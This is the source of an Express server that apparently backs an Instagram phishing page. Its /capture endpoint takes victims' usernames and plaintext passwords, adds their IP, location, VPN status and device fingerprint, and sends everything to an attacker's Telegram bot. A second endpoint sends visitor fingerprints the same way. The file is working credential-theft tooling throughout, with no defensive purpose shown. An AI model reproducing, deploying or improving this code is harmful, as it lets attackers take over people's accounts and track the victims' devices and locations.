import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = Number(process.env.PORT) || 8080;
const distPath = path.join(__dirname, 'dist');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID;

app.disable('x-powered-by');
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com data:; connect-src 'self' https://ipapi.co https://api.telegram.org; frame-ancestors 'none'; object-src 'none'; base-uri 'self';");
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
  next();
});

app.post('/api/fingerprint', async (req, res) => {
  const body = req.body?.data ?? req.body ?? {};
  const fingerprint = body && typeof body === 'object' ? body : {};

  const lines = [
    '🔥 Fingerprint captured',
    '',
    `🧭 Visitor ID: ${fingerprint.visitorId || 'N/A'}`,
    `🛰️ IP: ${fingerprint.ip || 'N/A'}`,
    `🏢 ISP: ${fingerprint.isp || 'N/A'}`,
    `🌍 Country: ${fingerprint.country || 'N/A'} / ${fingerprint.countryCode || 'N/A'}`,
    `🏙️ City: ${fingerprint.city || 'N/A'}`,
    `🕒 Timezone: ${fingerprint.timezone || 'N/A'}`,
    `🖥️ User-Agent: ${fingerprint.userAgent ? String(fingerprint.userAgent).substring(0, 120) : 'N/A'}`,
    `📐 Screen: ${fingerprint.screen || 'N/A'}`,
    `🧠 Hardware: ${fingerprint.hardwareConcurrency || 'N/A'} cores / ${fingerprint.deviceMemory || 'N/A'} GB`,
    `🔋 Battery: ${fingerprint.battery || 'N/A'}`,
    `🎮 GPU: ${fingerprint.gpu?.vendor || 'N/A'} / ${fingerprint.gpu?.renderer || 'N/A'}`,
    `📷 Canvas: ${fingerprint.canvas || 'N/A'}`,
    `🕵️ VPN: ${fingerprint.isVpn ? 'Yes' : 'No'}`,
    `🕒 Timestamp: ${fingerprint.timestamp || new Date().toISOString()}`,
  ];

  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      const telegramMessage = lines.join('\n');
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: Number(TELEGRAM_CHAT_ID),
          text: telegramMessage,
          parse_mode: 'HTML',
        }),
      });
    } catch (err) {
      console.error('Telegram fingerprint delivery failed:', err.message || err);
    }
  }

  return res.json({ success: true });
});

app.use(express.static(distPath));

app.post('/capture', async (req, res) => {
  const { username, password, target, time, fingerprint } = req.body || {};

  console.log(`[CAPTURED] Username: ${username || 'N/A'}`);

  if (!username || !password) {
    return res.json({ success: true });
  }

  const fp = fingerprint || {};
  const message = `
<b>🔥 Instagram Login Captured</b>

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> <code>${password}</code>
🎯 <b>Target:</b> ${target || 'aadya.tiwari.me'}
⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}

🌐 <b>Network & Location</b>
📍 IP: ${fp.ip || 'N/A'}
🏢 ISP: ${fp.isp || 'N/A'}
📍 Location: ${fp.city || 'N/A'}, ${fp.country || 'N/A'}
🛡️ VPN / Proxy: ${fp.isVpn ? 'Yes' : 'No'}

📱 <b>Device Fingerprint</b>
🖥️ User-Agent: <code>${fp.userAgent ? String(fp.userAgent).substring(0, 80) + '...' : 'N/A'}</code>
📐 Screen: ${fp.screen || 'N/A'}
🌍 Timezone: ${fp.timezone || 'N/A'}
🔋 Battery: ${fp.battery || 'N/A'}
💻 GPU: ${fp.gpu?.vendor || 'N/A'} - ${fp.gpu?.renderer || 'N/A'}
⚙️ Cores: ${fp.hardwareConcurrency || 'N/A'} | Memory: ${fp.deviceMemory || 'N/A'}
  `.trim();

  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: Number(TELEGRAM_CHAT_ID),
        text: message,
        parse_mode: 'HTML',
      };

      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const responseText = await response.text();
      console.log('Telegram response status:', response.status);
      console.log('Telegram response body:', responseText);
    } catch (err) {
      console.error('❌ Telegram failed:', err.message);
    }
  } else {
    console.warn('⚠️ Telegram credentials are missing or invalid.');
  }

  res.json({ success: true });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
